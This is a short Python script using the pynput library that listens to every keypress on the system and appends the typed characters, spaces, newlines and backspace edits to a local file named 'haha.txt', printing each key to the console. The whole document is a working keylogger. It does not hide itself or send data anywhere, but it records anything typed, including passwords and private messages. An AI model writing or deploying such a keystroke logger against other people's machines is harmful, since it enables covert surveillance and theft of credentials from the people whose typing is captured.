from pynput import keyboard

def fetch(key):
    try:
        print(f"Key {key.char} pressed")
        with open("haha.txt","a") as f:
            f.write(key.char)
    except AttributeError:
        if key==keyboard.Key.space:
            with open("haha.txt","a") as f:
                f.write(' ')
            print("Space key pressed")
        elif key==keyboard.Key.enter:
            with open("haha.txt","a") as f:
                f.write('\n')
            print("Enter key pressed")
        elif key==keyboard.Key.backspace:
            with open("haha.txt","r+") as f:
                content=f.read()
                f.seek(0)
                f.write(content[:-1])
                f.truncate()
            print("Backspace key pressed")
        else:
            print(f"Special key {key} pressed")

with keyboard.Listener(on_press=fetch) as listener:
    listener.join()
